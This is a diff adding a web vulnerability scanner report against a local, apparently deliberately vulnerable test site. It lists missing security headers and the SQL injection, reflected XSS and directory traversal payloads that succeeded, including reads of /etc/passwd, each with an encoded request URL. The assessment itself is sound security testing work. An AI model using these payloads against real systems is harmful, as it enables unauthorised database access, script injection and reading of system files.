@@ -1,0 +1,124 @@
+==================================================
+WEB VULNERABILITY SCANNER REPORT
+==================================================
+Target:  http://localhost
+Date:    2026-07-28 10:36:51
+
+--------------------------------------------------
+RECONNAISSANCE
+--------------------------------------------------
+Status Code:    200
+Server:         Apache/2.4.25 (Debian)
+Content-Type:   text/html;charset=utf-8
+Content-Length: 1523 chars
+Redirects to:   http://localhost/login.php
+
+--------------------------------------------------
+SECURITY HEADERS
+--------------------------------------------------
+Present: 0/6
+
+[MISSING] [HIGH] Strict-Transport-Security
+          Forces HTTPS connections
+[MISSING] [HIGH] Content-Security-Policy
+          Prevents XSS attacks
+[MISSING] [MEDIUM] X-Frame-Options
+          Prevents clickjacking
+[MISSING] [MEDIUM] X-Content-Type-Options
+          Prevents MIME sniffing
+[MISSING] [LOW] Referrer-Policy
+          Controls referrer information
+[MISSING] [LOW] Permissions-Policy
+          Controls browser features
+
+--------------------------------------------------
+PATH SCAN
+--------------------------------------------------
+[301] REDIRECT   http://localhost/config
+[200] FOUND      http://localhost/robots.txt
+[403] FORBIDDEN  http://localhost/server-status
+
+--------------------------------------------------
+VULNERABILITIES
+--------------------------------------------------
+[!] SQL Injection
+    Parameter: id
+    Payload:   '
+    Evidence:  you have an error in your sql syntax
+    URL:       http://localhost/vulnerabilities/sqli/?id=%27&Submit=Submit
+
+[!] SQL Injection
+    Parameter: id
+    Payload:   ' OR '1'='1' --
+    Evidence:  you have an error in your sql syntax
+    URL:       http://localhost/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271%27+--&Submit=Submit
+
+[!] SQL Injection
+    Parameter: id
+    Payload:   1' ORDER BY 1--
+    Evidence:  you have an error in your sql syntax
+    URL:       http://localhost/vulnerabilities/sqli/?id=1%27+ORDER+BY+1--&Submit=Submit
+
+[!] SQL Injection
+    Parameter: id
+    Payload:   1' ORDER BY 2--
+    Evidence:  you have an error in your sql syntax
+    URL:       http://localhost/vulnerabilities/sqli/?id=1%27+ORDER+BY+2--&Submit=Submit
+
+[!] Reflected XSS
+    Parameter: name
+    Payload:   <script>alert('xss')</script>
+    Evidence:  Payload reflected unencoded in response
+    URL:       http://localhost/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27c87240d7%27%29%3C%2Fscript%3E
+
+[!] Reflected XSS
+    Parameter: name
+    Payload:   <img src=x onerror=alert('xss')>
+    Evidence:  Payload reflected unencoded in response
+    URL:       http://localhost/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%271d101e3d%27%29%3E
+
+[!] Reflected XSS
+    Parameter: name
+    Payload:   '><script>alert('xss')</script>
+    Evidence:  Payload reflected unencoded in response
+    URL:       http://localhost/vulnerabilities/xss_r/?name=%27%3E%3Cscript%3Ealert%28%27f94db6f5%27%29%3C%2Fscript%3E
+
+[!] Reflected XSS
+    Parameter: name
+    Payload:   "><script>alert('xss')</script>
+    Evidence:  Payload reflected unencoded in response
+    URL:       http://localhost/vulnerabilities/xss_r/?name=%22%3E%3Cscript%3Ealert%28%27e40a6efa%27%29%3C%2Fscript%3E
+
+[!] Reflected XSS
+    Parameter: name
+    Payload:   <svg onload=alert('xss')>
+    Evidence:  Payload reflected unencoded in response
+    URL:       http://localhost/vulnerabilities/xss_r/?name=%3Csvg+onload%3Dalert%28%2787b82af0%27%29%3E
+
+[!] Reflected XSS
+    Parameter: name
+    Payload:   javascript:alert('xss')
+    Evidence:  Payload reflected unencoded in response
+    URL:       http://localhost/vulnerabilities/xss_r/?name=javascript%3Aalert%28%27a273df68%27%29
+
+[!] Directory Traversal
+    Parameter: page
+    Payload:   ../../../../../../etc/passwd
+    Evidence:  Content of etc/passwd found in response
+    URL:       http://localhost/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+[!] Directory Traversal
+    Parameter: page
+    Payload:   ../../../../../../etc/hosts
+    Evidence:  Content of etc/hosts found in response
+    URL:       http://localhost/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts
+
+[!] Directory Traversal
+    Parameter: page
+    Payload:   ../../../../../../proc/version
+    Evidence:  Content of proc/version found in response
+    URL:       http://localhost/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion
+
+
+==================================================
+END OF REPORT
